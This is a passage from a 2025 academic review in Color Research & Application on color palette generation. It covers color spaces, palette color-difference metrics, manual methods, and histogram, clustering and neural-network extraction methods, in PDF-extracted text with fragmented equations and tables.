+Perceptual color spaces like HSV, HSL, and HSI are designed
+for  intuitive  color  handling,  providing  similar  hue  descrip-
+tions but differing in saturation and lightness. HSL is immune
+to  lighting  variations  due  to  its  lightness  component,  while
+## (1)
+r=
+## R
+## R+G+B
+## (2)
+g=
+## G
+## R+G+B
+## (3)
+b=
+## B
+## R+G+B
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 252
+## Color Research & Application, 2025
+HSV, though facing similar challenges, is preferred for its in-
+tuitive  geometric  representation.  Some  studies  modify  these
+models  by  ignoring  the  illumination  [20 –22]  or  saturation
+[23, 24] components to reduce the impact of shadows or high-
+lights,  focusing  solely  on  hue.  The  hue,  often  represented  as
+an angle on a circle, can cause discontinuity issues, especially
+near  red,  which  is  typically  addressed  by  using  dual  ranges
+for hue. Additionally, when the maximum and minimum val-
+ues of RGB are equal (corresponding to a grayscale tone), the
+hue  has  an  undefined  value  (Equation 4).  Existing  software
+libraries  often  set  it  to  zero  (red),  leading  to  incorrect  color
+interpretations. Moreover, when the sum of the maximum and
+minimum  values  of  RGB  is  2,  the  saturation  becomes  unde-
+fined (Equation 5).
+## 2.2   |   Device- Independent Color Space
+Device- independent color spaces are designed to represent col-
+ors consistently across different devices and media, ensuring
+accurate color reproduction regardless of the specific hardware
+involved.  One  of  the  most  fundamental  device-  independent
+color   spaces   is   CIEXYZ,   developed   by   the   International
+Commission  on  Illumination  (CIE).  CIEXYZ  is  based  on  the
+human  visual  system  and  defines  colors  using  a  set  of  three
+tristimulus  values  (X, Y, Z)  that  correspond  to  the  response
+of the human eye to different wavelengths of light. This color
+space serves as a foundation for many other color models and
+is  widely  used  in  color  science  for  its  ability  to  represent  all
+perceivable  colors.  Another  widely  used  device-  independent
+color space is CIEL*a*b*, also developed by CIE, which is de-
+rived  from  CIEXYZ  but  is  designed  to  be  more  perceptually
+uniform,  meaning  that  the  perceived  differences  between
+colors  are  more  consistent  across  the  spectrum.  CIEL*a*b*
+represents  color  with  three  coordinates:  L*  for  lightness,  a*
+for the red- green axis, and b* for the yellow- blue axis, making
+it  a  popular  choice  for  applications  that  require  precise  color
+matching, such as digital imaging and printing.
+More advanced models, such as CIECAM02 [25], extend the ca-
+pabilities  of  device-  independent  color  spaces  by  incorporating
+contextual  information  such  as  the  surrounding  environment
+and  viewing  conditions,  providing  a  more  comprehensive  ap-
+proach  to  color  appearance  modeling.  CIECAM02  is  particu-
+larly useful in applications where the perception of color can be
+significantly influenced by external factors, such as in lighting
+design or visual ergonomics. By accounting for these variables,
+CIECAM02 offers a more accurate prediction of how colors will
+appear  under  different  conditions,  making  it  a  valuable  tool
+for  industries  that  require  meticulous  color  control.  Moreover,
+with the increasing importance of color management in digital
+workflows,  the  use  of  device-  independent  color  spaces  has  be-
+come essential for ensuring that colors remain consistent from
+design to final output, whether in print, on screens, or in other
+visual media.
+## (4)
+## H=
+## ⎧
+## ⎪
+## ⎪
+## ⎪
+## ⎨
+## ⎪
+## ⎪
+## ⎪
+## ⎩
+## 60∗
+## �
+## G−B
+max
+## (
+## R,G,B
+## )
+## −min
+## (
+## R,G,B
+## )
+## �
+## R=max
+## (
+## R,G,B
+## )
+## 60∗
+## �
+## 2+
+## (
+## B−R
+## )
+max
+## (
+## R,G,B
+## )
+## −min
+## (
+## R,G,B
+## )
+## �
+## G=max
+## (
+## R,G,B
+## )
+## 60∗
+## �
+## 4+
+## (
+## R−G
+## )
+max
+## (
+## R,G,B
+## )
+## −min
+## (
+## R,G,B
+## )
+## �
+## B=max
+## (
+## R,G,B
+## )
+## (5)
+## S=
+max
+## (
+## R,G,B
+## )
+## −
+min
+## (
+## R,G,B
+## )
+## 1−∣(max
+## (
+## R,G,B
+## )
+## +min
+## (
+## R,G,B
+## )
+## −1∣
+## (6)
+## L=
+max
+## (
+## R,G,B
+## )
+## +min
+## (
+## R,G,B
+## )
+## 2
+FIGURE 1    |    Visible spectrum (wavelengths in meters).
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 253
+3   |   Color Difference of Color Palettes
+The color difference between color palettes is developed to com-
+pare the color inconsistency between two palettes. Imagine that
+we  have  several  color  palettes  extracted  from  an  image  using
+different  computational  methods  and  want  to  decide  which  of
+these  palettes  best  matches  a  color  palette  extracted  visually.
+We therefore need a method for estimating the color difference
+between  two  palettes.  This  is  not  so  easy  as  several  colors  are
+included in each color palettes.
+Tokumaru,   Muranaka,   and   Imanishi   published   their   work
+on  the  evaluation  of  a  color  scheme's  harmony  in  the  early
+stage  [26].  Besides  the  application  of  color  schemes  in  product
+and  interior  design,  color  palettes  can  also  be  applied  in  color
+image  quantization  in  computer  graphics  and  image  process-
+ing [27–29]. Image and video quality is often assessed by image
+comparison  [30].  The  image  comparison  often  involves  pixel-
+by- pixel comparison when the images display the same content
+or  scene.  Other  image  comparison  metrics  include  key-  point
+matching [31], histogram method [32], and key- point + decision
+tree [33], and so forth.
+The problem of color palette difference is analogous to the prob-
+lem  of  color  difference  prediction  of  pairs  of  color  patches,  the
+traditional  color  difference  problem  can  be  considered  to  be  a
+special case of a more general problem where we need to com-
+pare a pair of several patches (i.e., palettes). Much research has
+been  conducted  on  this  special  case,  such  as  the  evaluation  of
+color difference between homogeneous colors [34–36]. For a pair
+of  homogeneous  color  samples  or  two  complex  images  viewed
+under  specific  conditions,  color  difference  formulas  try  to  pre-
+dict the visually perceived (subjective) color difference from in-
+strumental (objective) color measurements.
+The  last  50  years  have  seen  several  color-  difference  formulas
+being  published;  the  majority  of  these  are  based  on  CIEL*a*b*
+color   space,   including   CIE94,   CMC,   and   most   recently
+CIEDE2000,  which  is  the  current  CIE  recommendation  for
+small color difference [37].
+Pan  and  Westland  conducted  a  psychophysical  experiment
+with pairs of color palettes, each palette containing 25 differ-
+ent  color  patches  [38].  In  their  study,  three  different  palette-
+difference metrics were tested using the psychophysical data.
+The  metrics  tested  were:  (1)  Single  color-  difference  model
+(where  the  RGB  values  of  each  palette  were  averaged  and  a
+single  color  difference  was  calculated  between  the  palettes);
+(2) mean color- difference model (MECDM, where each patch
+in one palette was compared to the patches in the second pal-
+ette  and  the  mean  of  all  of  these  color  difference  was  calcu-
+lated);  and  (3)  minimum  color-  difference  model  (MICDM,
+where  each  patch  in  a  palette  was  compared  with  its  closest
+color  in  another  palette  and  the  mean  of  these  color  differ-
+ences was calculated). From their research result, we can see
+that MICDM outperformed the other two metrics based on all
+analyses. After that, they further explored methods for auto-
+matically  predicting  visual  similarity  between  palettes  [39].
+The color difference between the palettes was predicted using
+two algorithms, each based on one of six color- difference for-
+mulas. The best performance was obtained using the MICDM
+and the CIEDE2000 equation with a lightness weighing of 2,
+the  results  are  summarized  in  Table 1.  In  their  latest  study,
+three psychophysical experiments were conducted to compare
+the  newly  proposed  Hungarian  model  with  the  MICDM  and
+the MECDM. The results indicate that both the MICDM and
+the Hungarian model outperform the MECDM in terms of fit-
+ting visual data. Furthermore, the study also reveals that the
+MICDM  and  the  Hungarian  model  are  statistically  indistin-
+guishable [40].
+## 4   |   Color Palettes Generation Methods
+In  this  section,  we  discuss  the  color  palette  generation  meth-
+ods  of  traditional  manual  and  computer-  aided  automation.  For
+computer- aided automation methods, which include histogram-
+based,    clustering-    based,    and    neural    network-    based    ones.
+Methods  of  color  palette  generation  are  classified  as  follows
+(Figure 2).
+## 4.1   |   Traditional Manual Methods
+Color  palette  selection  is  manually  related  to  the  color  interac-
+tion  [41]  on  visual  perception.  The  visual  effects  produced  by
+different colors vary, with warm colors evoking a sense of liveli-
+ness and warmth, and cool colors creating feelings of calmness
+and refreshment. The contrast between colors can impact peo-
+ple's  perception  of  them,  affecting  factors  such  as  brightness,
+saturation, and temperature. Thus, when designing, it is import-
+ant to select colors that are suitable for the content and emotion
+of the image, while also taking into account their performance
+in various backgrounds and environments. By doing so, design-
+ers can create effective and impactful designs that resonate with
+their intended audience.
+The  advantage  of  manually  selection  of  color  palettes  is  that
+they allow designers to use colors more flexibly and customize
+their  color  schemes  according  to  their  preferences  and  styles.
+However,  hand-  extracted  palettes  also  have  some  limitations,
+such  as  they  may  be  influenced  by  personal  preferences  and
+experiences,  or  they  may  ignore  some  details  and  changes.
+Therefore, designers still need to refer to some professional color
+guides  and  tools  when  using  hand-  extracted  palettes,  such  as
+Pantone charts, RGB and CMYK color space, and so forth [42].
+Traditional  methods  of  manually  generating  color  palettes  in-
+volve the following steps [43]: selecting a base color, determining
+the type of palette, choosing a color scheme, and adjusting and
+optimizing. The workflow is as below, and detail of each step is
+presented (Figure 3).
+Step 1: Selecting a base color. When manually creating a color
+palette, the first step is to choose a base color as a starting point.
+The  base  color  can  be  a  primary,  a  theme,  or  a  specific  refer-
+ence color.
+Step  2:  Determining  the  type  of  palette.  Based  on  the  re-
+quirements or the design goals, the desired type of color palette
+is determined. The palette type can be monochromatic, comple-
+mentary, poly- chromatic, gradient, and so on. Each type has dif-
+ferent effects and application scenarios.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 254
+## Color Research & Application, 2025
+Step  3:  Choosing  a  color  scheme.  After  determining  the
+type of palette, the next step is to select a suitable color scheme
+within  that  palette  type.  This  involves  choosing  additional
+colors that harmonize with the base color and align with the
+selected palette type. For example, if the palette type is mono-
+chromatic, variations of the base color would be chosen. If it is
+complementary, colors opposite to the base color on the color
+wheel  would  be  selected.  This  step  ensures  coherence  and
+unity  within  the  palette  while  also  considering  the  intended
+aesthetic or message.
+Step  4:  Adjusting  and  optimizing.  Once  an  initial  color
+scheme  is  chosen,  adjustments  and  optimizations  can  be  made
+to  refine  the  color  palette.  Fine-  tuning  of  colors  can  be  per-
+formed,  such  as  adjusting  hue,  saturation,  brightness,  and  so
+forth, to achieve better color combinations and effects. Neutral
+colors can be added, and certain colors can be added or removed
+to  enhance  overall  balance  and  harmony.  Contrast  adjustment
+is also an important aspect of adjusting the color palette, where
+increasing  or  decreasing  color  contrast  can  change  the  overall
+effect.
+It should be noted that the traditional manual methods rely on
+subjective judgments and aesthetic viewpoints, emphasizing the
+experience and intuition of artists. Even though they are widely
+used in design and art fields to create unique and personalized
+color  palettes,  they  face  limitations  such  as  time-  consuming
+nature,  subjectivity,  and  difficulty  in  meeting  large-  scale  and
+rapid  generation  requirements.  With  the  development  of  com-
+puter   technology,   automated   methods   for   generating   color
+palettes  have  gained  attention  and  found  wide  applications  in
+recent years.
+TABLE 1    |    Calculation of r
+## 2
+and STRESS values for the six color- difference equations and the two algorithms of MICDM and MECDM [39].
+r
+## 2STRESS
+## ∆E
+m
+## —MECDM∆E
+p
+## —MICDM∆E
+m
+## —MECDM∆E
+p
+## —MICDM
+## CIELAB0.3450.82143.119.33
+## C MC (1,1)0.2130.76841.8722.99
+## C MC (2 ,1)0.2560.81244.0619.31
+## CIE940.2810.76845.5422.69
+## CIE2000 (1,1,1)0.3250.83240.3418.92
+## CIE20000 (2,1,1)0.3920.86439.2916.93
+FIGURE 2    |    Diagram of color palette generation methods classification.
+FIGURE 3       |    Flowchart and principles for traditional manual- based color palette generation methods.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 255
+## 4.2   |   Computer- Aided Automation Methods
+## 4.2.1   |   Histogram- Based Methods
+The  basic  idea  of  the  histogram-  based  color  palette  generation
+method is to convert the color information of image pixels into
+a  histogram  and  then  identify  the  most  frequent  colors  in  the
+histogram  as  the  dominant  colors  of  the  image.  Specifically,
+for  a  color  image,  we  can  split  it  into  the  three  RGB  channels
+and then compute the histogram for each channel, resulting in
+three  single-  channel  histograms  (as  shown  in  Figure 4).  Next,
+we combine the three histograms to create a merged histogram.
+In  the  merged  histogram,  the  color  with  the  highest  frequency
+represents the dominant color of the image.
+Delon et al. proposed an algorithm that identifies spatial regions
+in natural images based on the peaks in the hue, saturation, and
+value histograms [44, 45]. This approach extracts color themes,
+but  the  resulting  sets  may  contain  redundant  colors  due  to  its
+hierarchical  nature.  Morse  et  al.  also  employed  a  hierarchical
+histogram method to extract color themes, but they added con-
+straints on the maximum number of colors and the color distance
+[46].  However,  they  did  not  provide  user  or  quantitative  evalu-
+ations  to  compare  their  themes  with  other  methods.  Although
+histogram-  based  methods  for  extracting  the  main  colors  of  an
+image are simple and easy to implement, they have some limita-
+tions. First, this method does not consider the brightness infor-
+mation of colors, so the extracted main colors may not align with
+human visual perception. Second, it cannot handle cases of non-
+uniform color distribution, as it may result in the most frequent
+colors in the histogram not being representative of the image.
+## 4.2.2   |   Clustering- Based Methods
+Clustering-   based   methods   are   one   of   the   mainstream   ap-
+proaches  for  color  palette  extraction.  This  method  divides  the
+color space into different regions and clusters colors into groups
+or categories. Then, representative colors are selected from each
+cluster  to  form  the  color  palette.  The  commonly  used  cluster-
+ing  algorithms  for  this  color  palette  generate  include  K-  means,
+fuzzy C- means (FCM), and self- organizing maps (SOM).
+4.2.2.1   |   K- Means. The K- means algorithm is one of the most
+popular algorithms [47]. It aims to find K clusters by minimizing
+the  mean  square  quantization  error  (MSQE)  of  the  sample  set
+with the set number of clusters. The algorithm attempts to locate
+K prototypes (centroids) across the entire sample set, in order to
+best  represent  the  data  to  some  extent.  The  K-  means  algorithm
+can cluster all the pixels in the color space into a specified num-
+ber of clusters, and then select the average color of each cluster as
+the colors on the color palette. Barbakh, Ying, and Colin summa-
+rized the K- means algorithm as follows [48] (Figure 5).
+FIGURE 4    |    Histograms of RGB channels of an image.
+FIGURE 5    |    Diagram of K- means algorithm steps.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 256
+## Color Research & Application, 2025
+Although the K- means is now widely used in different areas, it is
+always have some issues need to be improved. First, it is highly
+sensitive  to  the  selection  of  initial  cluster  centers,  which  can
+lead to different clustering results with different initial centers.
+Second, it is sensitive to outliers, which may affect the accuracy
+of clustering results. Additionally, it is assumed that all clusters
+have  the  same  variance  and  the  clustering  shape  is  spherical,
+which may not always hold true.
+4.2.2.2   |   Fuzzy C- Means.    To    address    the    issues    in
+the K- means method, we have the optimized FCM method. The
+FCM  algorithm  is  proposed  by  Bezdek  and  aims  to  optimize
+image colorization errors [49, 50]. Unlike K- means, FCM allows
+each  data  point  to  belong  to  multiple  clusters  rather  than  just
+one.  This  soft  clustering  approach  is  more  suitable  for  handling
+data uncertainty and boundary fuzziness. Moreover, FCM is less
+sensitive  to  the  selection  of  initial  centers  and  does  not  restrict
+the  shape  of  clusters,  thus  offering  more  flexibility  to  adapt  to
+different  data  distributions.  In  summary,  FCM  often  outper-
+forms  the  K-  means  when  dealing  with  data  containing  noise
+or uncertainty.
+Since  the  FCM  method  (Figure 6)  was  proposed,  it  received
+extensive  attention  and  research  from  scholars  on  the  second
+floor.  Ahmed  introduced  distance  information  to  optimize
+pixel membership degrees in the FCMS algorithm [51]. Szilagyi
+weighted feature attributes of adjacent pixels in the EnFCM al-
+gorithm [52]. Chen and Zhang optimized the FCMS algorithm
+by incorporating mean and median values, resulting in FCMS1
+and FCMS2 algorithms [53]. Zhao replaced mean and median
+filtering with non- local means filtering in FCMS1 and FCMS2,
+proposing  an  algorithm  with  self-  adjustable  non-  local  spatial
+information  [54].  Krinidis  and  Chatzis  introduced  fuzzy  fac-
+tors and developed the FLICM algorithm for noise image seg-
+mentation  [55].  Gong  incorporated  texture  features  into  the
+FLICM  algorithm,  considering  spatial  information  [56].  Du
+and Wu replaced Euclidean space with the reproducing kernel
+Hilbert  space  in  the  kernel  space  intuitionistic  fuzzy  cluster-
+ing  algorithm  [57].  Leski  introduced  M-  estimators  and  OWA
+operators in the FCOM algorithm, improving robustness at the
+cost of increased computation time [58]. Liu enhanced FCOM
+with  noise  resistance,  range-  normalized  feature  weighting,
+and improved computational speed, resulting in the FWFCOM
+algorithm [59].
+4.2.2.3   |   Self- Organizing   Maps.  The  FCM  algorithm  has
+achieved  extensive  research  and  application  in  image  process-
+ing but still faces issues such like it do not considering the topo-
+logical structure of the sample set, and not achieving nonlinear
+mapping  of  the  sample  set,  which  makes  it  limited  for  more
+complex data. The efficiency of traditional clustering is relatively
+low  when  processing  large-  scale  datasets.  Therefore,  the  new
+method of SOM was came up to deal with the issues existing in
+previous  methods  [60].  It  is  more  efficient  to  process  unlabeled
+sample sets and well adapt to the sparsity of sample spaces, mak-
+ing  it  demonstrate  superior  performance  and  applicability  over
+traditional  clustering  algorithms  across  various  aspects.  The
+SOM algorithm consists of an input layer and a competitive layer.
+During the network training phase, the initial network structure
+is defined based on the input data size and desired output. The
+network  nodes'  weight  vectors  are  then  trained  in  an  unsuper-
+vised  manner  using  the  input  data  sequence.  Detailed  steps
+of SOM are presented in Figure 7.
+Many  researchers  use  the  SOM  for  clustering  segmentation  of
+color images. Among them, Ong proposed a two- stage competi-
+tive network segmentation method based on the CIE color space
+[61].  The  algorithm  first  establishes  a  fixed  two-  dimensional
+structured  feature  network  as  the  competitive  layer  to  capture
+the  main  colors  of  the  image.  In  the  second  stage,  a  variable-
+sized one- dimensional network structure is used to control the
+number of clusters and achieve segmentation. Chang et al. in-
+troduced a frequency- sensitive competitive learning strategy for
+color quantization [62]. This method optimizes the main color
+palette  using  the  SOM  network  and  imposes  constraints  on
+FIGURE 6    |    Diagram of fuzzy C- means algorithm steps.
+FIGURE 7    |    Diagram of SOM algorithm steps.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 257
+data input using a butterfly permutation sequence pattern. The
+frequency-  sensitive  model  is  particularly  suitable  for  adjust-
+ing  the  strategies  of  neighboring  neurons.  Yeo  et  al.  proposed
+a  combination  of  self-  organizing  map  network  and  adaptive
+resonance  theory  (ART)  [63].  The  algorithm  utilizes  plasticity-
+adjusting  parameters  to  constrain  the  network,  resolving  the
+contradiction   between   stability   and   structural   invariance.
+Wang, Lee, and Hsieh suggested constructing the network based
+on  the  scale  of  the  input  data  samples,  where  the  parameters
+and neighborhood function of the network are controlled by the
+sample quantity [64].
+4.2.2.4   |   Application  of  the  Clustering  Methods.    The
+application instance of the above clustering methods is further
+investigated and summarized. In a study by Mathur and Purohit,
+the K- means clustering algorithm was applied to various images
+in  different  color  spaces:  RGB,  CIEL*a*b*,  YCbCr,  and  HSV
+color  spaces  [65].  From  the  study,  it  can  be  concluded  that
+the CIEL*a*b*and YCbCr color spaces provide the best segmen-
+tation of color images based on color components. Among these
+two color spaces, CIEL*a*b* color space is widely accepted as its
+execution time is shorter even in scenarios with a large number
+of color components in the image.
+In a study by Hu et al., two schemes were proposed for designing
+color image quantization palettes [66]. The first scheme, initially
+proposed by Hu et al., generates the palette gradually through a
+process of cell splitting and pixel grouping. The second scheme
+employs the K- means clustering algorithm using the initial pal-
+ette  generated  by  the  first  scheme.  Experimental  results  show
+that the second scheme has a lower computational cost but pro-
+vides  a  better  color  palette  compared  to  the  first  scheme.  Both
+schemes are suitable for real- time multimedia applications due
+to their low computational cost.
+Shmmala  and  Ashour  conducted  color-  based  image  segmenta-
+tion using K- means, weighted K- means, and inverse weighted K-
+means clustering algorithms in the CIEL*a*b* and RGB spaces
+[67]. They found that K- means and its related versions are highly
+sensitive  to  noise,  while  inverse  weighted  K-  means  with  a  low
+noise  level  yields  the  best  results.  However,  under  moderate
+noise  levels,  all  mentioned  versions  produce  similar  results,
+while  for  larger  noise  levels,  both  K-  means  and  its  related  ver-
+sions fail to provide accurate segmentation.
+Arumugadevi and Seenivasagam compared the performance of
+K-  means,  FCM,  and  SOM  algorithms  and  found  that  the  FCM
+clustering algorithm performs better when applied to CIEL*a*b*
+color  reduced  images,  while  the  trained  SOM  network  reduces
+the execution time of color image segmentation [68]. In terms of
+color image segmentation, both FCM and SOM algorithms out-
+perform the K- means algorithm.
+The main issue with the K- means algorithm is its dependence on
+prototype initialization. If the initial prototypes are not carefully
+selected,  the  computation  may  converge  to  a  local  minimum
+instead  of  the  global  minimum.  Therefore,  proper  initialization
+of  prototypes  can  have  a  significant  impact  on  the  outcome  of
+K- means.
+## 4.2.3   |   Neural Network- Based Methods
+A generic neural network structure is a foundational architec-
+ture  for  building  artificial  neural  networks,  consisting  of  an
+input layer, hidden layers, and an output layer. The input layer
+receives  raw  data,  hidden  layers  process  the  data  through
+neurons  with  weights  and  activation  functions,  and  the  out-
+put layer generates the final result, such as classification or re-
+gression. Each neuron processes inputs and passes the result
+to  the  next  layer.  This  flexible  structure  is  widely  applied  in
+areas like image recognition and natural language processing.
+The neural network- based color palette generation method is
+an approach that utilizes deep learning techniques to generate
+color  schemes.  This  method  involves  training  a  neural  net-
+work to learn and capture color features from a large amount
+of color data and then generate new palettes that meet design
+requirements.
+In  recent  years,  neural  network-  based  color  palette  generation
+methods have gained popularity for their ability to generate di-
+verse  and  customizable  color  schemes  to  meet  design  require-
+ments. However, these methods also pose some challenges, such
+as data collection and processing difficulties, as well as the com-
+plexity  of  the  neural  network  model.  Despite  these  challenges,
+various  neural  network  methods  have  emerged,  each  with  its
+strengths  and  weaknesses  (as  shown  in  Table 2).  While  some
+methods excel in certain aspects, they may fall short in others.
+To overcome these limitations, it is a common practice to com-
+bine  multiple  neural  network  methods  to  maximize  the  effec-
+tiveness  of  color  palette  extraction  (as  shown  in  Table 3).  This
+kind of approach not only enhances flexibility but also ensures
+the  consideration  of  visual  context,  which  is  often  overlooked
+in predefined palettes. Designing an effective palette remains a
+time- consuming and challenging process, even for experts, un-
+derscoring the importance of leveraging diverse neural network
+techniques.
+Liu  et  al.  [69]  proposed  an  image-  driven  color  generation
+method  that  leverages  human  perception  to  create  visually
+appealing  palettes  by  analyzing  constraints  like  harmony,
+distinction,  and  context.  Their  unique  approach  uses  a  color
+clustering  method  based  on  visual  saliency  and  hue  values,
+enabling   finer   color   extraction   from   main   subjects.   This
+method  generates  harmonious  palettes  tailored  to  different
+visualization contexts, with two strategies for color optimiza-
+tion and allocation designed for various data types, encoding
+colors into the visualization accordingly. Detail of the method
+is plotted in Figure 8.
+However,  due  to  the  variability  of  colors  and  the  influence  of
+various  light  sources,  precise  analysis  of  colors  becomes  chal-
+lenging.  Traditional  methods  address  this  issue  by  reducing
+the  color  range  or  clustering  pixel  values  [70,  71],  but  classifi-
+ers  can  only  categorize  colors  rather  than  provide  specific  and
+accurate  representations.  Kim  and  Kang's  classifiers  can  only
+categorize  colors  rather  than  propose  a  color  palette  extraction
+system  based  on  a  generative  adversarial  network  (GAN)  with
+chroma  fine-  tuning  and  reinforcement  learning.  The  system
+aims to find a method that represents colors themselves, similar
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 258
+## Color Research & Application, 2025
+to  a  color  palette,  to  help  identify  color  combinations  that  rep-
+resent the input image [72]. Feature maps are generated from a
+4-   channel (RGBY) image using a network validated by SRCNN,
+capturing  hidden  pixel-  level  information.  GAN  then  generates
+color   palettes,   optimizing   combinations   through   generator-
+discriminator  interaction,  while  reinforcement  learning  ad-
+justs chroma by modifying the Y component in the YCbCr color
+space, as is shown in Figure 9.
+They  also  compared  the  performance  of  the  K-  means  clus-
+tering algorithm, the ColorMind method, and their proposed
+method   using   different   backbone   networks   (i.e.,   EDSR,
+MDSR, and RDN, which are commonly used in image super-
+resolution)  and  with  or  without  chroma  fine-  tuning.  The
+results  are  shown  in  Table 4,  where  it  is  evident  that  their
+proposed method significantly outperforms the K- means clus-
+tering  algorithm  and  the  ColorMind  method  in  terms  of  ex-
+traction accuracy. The experiments demonstrate a successful
+generation  of  color  palettes  both  quantitatively  and  qualita-
+tively, with an accuracy of 0.9140.
+While  ColorMind  attempts  to  perform  color  filling  using
+conditional  adversarial  networks,  PaletteNet  aims  to  recolor
+images  using  a  given  color  palette  [73],  and  Text2color  fo-
+cuses on generating color palettes from given sentences using
+deep  learning  [74].  However,  none  of  these  methods  have  at-
+tempted to generate color palettes directly from given images.
+Moussa  and  Watanabe  introduce  the  use  of  adversarial  vari-
+ational  auto-  encoders  to  generate  and  extract  color  palettes.
+As  is  shown  in  Figure 10,  the  overall  structure  of  the  varia-
+tional  auto-  encoder  also  consists  of  three  main  parts,  a  con-
+volutional  encoder,  a  middle  sampling  layer  that  allows  the
+generation of latent codes, and a bidirectional long short- term
+memory  (LSTM)  decoder  that  generates  color  palettes  based
+on  the  latent  codes  [75].  Two  discriminators  are  employed
+in  the  model,  one  learns  to  assess  the  matching  between  the
+color palette and the input image, and the other evaluates the
+color palette itself. In addition, a supplementary noise vector
+is  fed  into  the  decoder,  enabling  the  generation  of  different
+color palettes for the same latent vector.
+The main limitation of the above- proposed model is its reliance
+on  data-  driven  approaches,  where  the  quality  of  the  training
+data largely determines the quality of the model. There is room
+for improvement in terms of color accuracy. While experts may
+take  several  minutes  to  create  a  palette  from  a  random  image,
+TABLE 2    |    Comparison of mainstream neural network- based color palette generation methods.
+## Type
+of the
+methodsAdvantagesDisadvantages
+CNN based
+## [75]
+- It can extract complex features from images.
+- It can undergo end- to- end training, resulting in good
+training performance.
+- It is suitable for processing large- scale image data and
+has good scalability.
+- Training requires a large amount of data and
+computational resources.
+- It requires a longer training time, which can be
+slow for real- time processing.
+- It is influenced by the network structure and
+may suffer from over- fitting issues.
+GAN based
+## [72]
+- By employing generative adversarial learning, we can
+effectively capture the distribution patterns of images,
+leading to improved accuracy in extracting dominant
+colors.
+- It exhibits good performance in handling large- scale
+datasets.
+- This approach can be extended to other domains
+beyond color extraction, such as image generation, where
+GANs have shown promising results.
+- The training process of GANs can be complex
+and requires a large amount of computation.
+- There may be challenges such as training
+instability and inconsistency in generated results,
+which can affect the reliability of color extraction.
+- GANs are susceptible to mode collapse, where
+the generator fails to capture the full diversity
+of the image distribution, leading to suboptimal
+performance in extracting dominant colors.
+## Attention
+based [76]
+- It allows for processing at the pixel level, resulting in
+high precision.
+- It enables extracting main colors from different regions
+of the image, providing more flexibility.
+- It has a lower computational requirement, resulting in
+faster processing speed.
+- Manual design of attention mechanisms
+is required, and improper design may lead to
+suboptimal results in main color extraction.
+- There might be issues with excessive or
+insufficient attention, which can affect the
+accuracy of main color extraction.
+- It may not be as effective for complex image
+structures.
+## Auto
+encoder
+based [75]
+- Feature extraction can be performed while preserving
+the integrity of the image.
+- The training process is relatively simple and requires
+less computational operations.
+- It is well- suited for small- scale datasets.
+- Auto encoders may potentially lose some
+important information in the image, which can
+affect the accuracy of extraction for main colors.
+- They struggle to handle complex image
+structures and have limitations in processing large-
+scale image datasets.
+15206378, 2025, 3, Downloaded from https://onlinelibrary.wiley.com/doi/10.1002/col.22975 by Nat Prov Indonesia, Wiley Online Library on [05/05/2026]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License
+
+## 259
+the proposed framework can suggest one or multiple provisional
+palettes instantly.
+5   |   Overview of the Color Palette Generation
+5.1   |   Classification of the Applications
+The past years have witnessed the application of color palettes in
+a wide range of fields, a coarse classification of the applications
+of  color  palettes  is  summarized  in  Table 5,  with  a  summary  of
+method  characteristics  and  the  foreseeable  development  trends
+of each application.
+5.2   |   Color Palette Generation in the AI Era
+In  recent  years,  AI  has  experienced  significant  development
+in   the   field   of   language   processing,   particularly   with   the
+emergence  of  large-  scale  pre-  trained  models  such  as  BERT
+[77],  RoBERTa  [78],  T5  [79],  DeBERTa  [80],  and  GPT-  2  [81].
+A  key  feature  of  these  models  is  their  significant  progress  in
+TABLE 3    |    Comparison of multiple neural network models.
+ModelsStructuresCharacteristics
+Liu et al. [69] (Figure 8)CNN: Used for extracting image features.
+Fully Connected Layers: Map the
+extracted features to palette generation.
+## Palette Generation Module:
+Generates and optimizes the palette
+based on the extracted features.
+Image- Driven: Utilizes image
+features to generate and optimize
+palettes, ensuring harmony
+with the image content.
+Diversity: Capable of
+generating diverse palettes
+suitable for various information
+visualization needs.
+Kim and Kang [72] (Figure 9)GAN: Used for generating initial palettes.
+RL: Used for fine- tuning chroma
+information and optimizing the palette.
+RGBY Image Processing: Creates feature
+maps using RGBY images and generates
+palettes through fully connected layers.
+## Chroma  Fine- Tuning: Fine-
+tunes chroma information
+through reinforcement learning,
+ensuring the accuracy and
+consistency of the palette.
+High Precision: The generated
+palettes excel in color accuracy,
+suitable for fields requiring
+precise color analysis.
